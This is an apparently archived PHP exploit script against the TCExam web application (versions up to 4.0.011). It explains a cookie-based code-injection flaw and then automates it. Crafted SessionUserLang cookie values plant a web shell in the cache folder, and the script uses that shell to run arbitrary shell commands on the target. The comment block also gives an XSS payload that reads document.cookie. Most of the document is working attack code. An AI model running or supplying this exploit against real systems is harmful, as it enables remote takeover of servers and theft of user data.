<?php
print_r('
--------------------------------------------------------------------------
TCExam <= 4.0.011 $_COOKIE["SessionUserLang"] shell injection exploit
by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org
---------------------------------------------------------------------------
');

/*
download site: http://sourceforge.net/projects/tcexam/

vulnerable code in /shared/code/tce_tmx.php lines 92-110:
...
	public function __construct($tmxfile, $language, $cachefile="") {
		// reset array
		$this->resource = array();
		// set selecteed language
		$this->language = strtoupper($language);
		// set filename for cache
		$this->cachefile = $cachefile;
		if (file_exists($this->cachefile)) {
			// read data from cache
			require_once($this->cachefile);
			$this->resource = $tmx;
		} else {
			if (!empty($this->cachefile)) {
				// open cache file
				file_put_contents($this->cachefile, "<"."?php\n".
				"// CACHE FILE FOR LANGUAGE: ".$language."\n".
				"// DATE: ".date("Y-m-d H:i:s")."\n".
				"// *** DELETE THIS FILE TO RELOAD DATA FROM TMX FILE ***\n", FILE_APPEND);
			}
...

$language argument is not checked for php injection, look at /shared/config/tce_config.php (various commets stripped):

...
if(isset($_REQUEST['lang'])
	AND (strlen($_REQUEST['lang']) == 2)
	AND (array_key_exists($_REQUEST['lang'],unserialize(K_AVAILABLE_LANGUAGES)))) {
	define ("K_USER_LANG", $_REQUEST['lang']);
	setcookie("SessionUserLang", K_USER_LANG, time() + K_COOKIE_EXPIRE, K_COOKIE_PATH, K_COOKIE_DOMAIN, K_COOKIE_SECURE);
} elseif (isset($_COOKIE['SessionUserLang'])) {
	define ("K_USER_LANG", $_COOKIE['SessionUserLang']);
} else {
	define ("K_USER_LANG", K_LANGUAGE);
}
require_once('../../shared/code/tce_tmx.php'); // TMX class
$lang_resources = new TMXResourceBundle(K_PATH_TMX_FILE, K_USER_LANG, K_PATH_CACHE.basename(K_PATH_TMX_FILE, ".xml")."_".K_USER_LANG.".php"); // istantiate new TMXResourceBundle object
$l = $lang_resources->getResource(); // language array
...

you can pass a special crafted 'SessionUserLang' cookie to create a new file in /cache folder
and inject a newline and some php code inside of it, ex:

...
Cookie: SessionUserLang=%2F..%2F%0Asystem%28%24_GET%5BCMD%5D%29%3B%3F%3E%23%2F..%2Fsuntzu;
...

a new file called suntzu.php like this is created in /cache folder;

<?php
// CACHE FILE FOR LANGUAGE: /../
system($_GET[CMD]);?>#/../suntzu
// DATE: 2007-04-29 16:07:25
// *** DELETE THIS FILE TO RELOAD DATA FROM TMX FILE ***


// EOF ----------
?>

which is directly accessible, then
you launch commands:

http://[target]/[path_to_tcexam]/cache/suntzu.php?CMD=ls%20-la

this works regardless of php.ini settings

also I found some xss's because of this code /shared/config/tce_config.php near lines 208-211:

...
// --- get posted and get variables (to be compatible with register_globals off)
foreach ($_REQUEST as $postkey => $postvalue) {
	$$postkey = $postvalue;
}
...
which allows to overwrite the $_SERVER[] array and God only knows what:

ex:
http://[target]/[path]/public/code/index.php?_SERVER[SCRIPT_NAME]="><script>alert(document.cookie)</script>

*/

if ($argc<4) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:      target server (ip/hostname)
path:      path to tcexam
cmd:       a shell command
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /tcexam/ ls -la -P1.1.1.1:80
php '.$argv[0].' localhost /tcexam/ ls -la -p81
---------------------------------------------------------------------------
');
    die;
}

error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";
$port=80;
$proxy="";

for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>'-p') and ($temp<>'-P')) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$exploit=urlencode("/../\neval(\$_SERVER[HTTP_CMD]);?>#/../suntzu");
$packet ="GET ".$p."public/code/index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Cookie: SessionUserLang=$exploit;\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
send($packet);
sleep(1);

$packet ="GET ".$p."cache/suntzu.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="CMD: echo '_delim_';error_reporting(7);set_time_limit(0);passthru(\$_SERVER[HTTP_C]);echo '_delim_';\r\n";
$packet.="C: ".$cmd."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
if (eregi("_delim_",$html)){
    $temp=explode("_delim_",$html);
    echo $temp[1];
}
else {echo "exploit failed...see html...\n$html";}
?>

# milw0rm.com [2007-04-29]
